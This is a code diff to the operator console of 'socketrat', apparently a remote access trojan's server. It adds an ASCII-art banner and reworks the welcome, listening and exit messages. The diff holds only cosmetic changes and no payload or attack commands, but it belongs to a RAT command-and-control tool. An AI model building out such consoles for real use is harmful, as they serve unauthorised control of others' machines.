@@ -1,5 +1,18 @@
 # -*- coding: utf-8 -*-
 
+'''
+%####%%%%%%%%%%####%
+%*+++%%%%%%%%%#+++#%
+%*+++**********+++#%
+%*++++++++++++++++#%
+%####+++###*+++###%%
+%####+++#%%#++*####%
+%*+++%%%%%%%%%#+++#%                    8           w              w   
+%#***%%%***#%%#***#%    d88b .d8b. .d8b 8.dP .d88b w8ww 8d8b .d88 w8ww 
+%%%%%%%%+++*%%%%%%%%    `Yb. 8' .8 8    88b  8.dP'  8   8P   8  8  8   
+%%%%%%%%####%%%%%%%%    Y88P `Y8P' `Y8P 8 Yb `Y88P  Y8P 8    `Y88  Y8P
+'''
+
 import cmd
 import os
 import socket
@@ -91,7 +104,10 @@ class ThreadingRATServer(socketserver.ThreadingMixIn, RATServer):
 
 
 class RATServerCmd(cmd.Cmd):
-    intro = 'Type help or ? to list commands.\n'
+    banner = __doc__
+    greeting = 'Welcome to the socketrat shell.\nType help or ? to list commands.\n'
+    intro = banner + greeting
+    outro = 'Thank you for using socketrat.'
     prompt = '(socketrat) '
     ruler = '-'
     nohelp = '*** {}'.format(Style.BRIGHT + Fore.RED + 'No help on %s' + Style.RESET_ALL)
@@ -222,10 +238,14 @@ if __name__ == '__main__':
         t.start()
 
         sh = RATServerCmd(server)
-        sh.info('Serving on {} port {} ...'.format(host, port))
+        print(sh.banner)
+        sh.info('Listening on {} port {} ...'.format(host, port))
+        print()
+        print(sh.greeting)
         try:
-            sh.cmdloop()
+            sh.cmdloop(intro='')
         finally:
             sh.info('Stopping server ...')
             server.shutdown()
+            print(sh.outro)
 
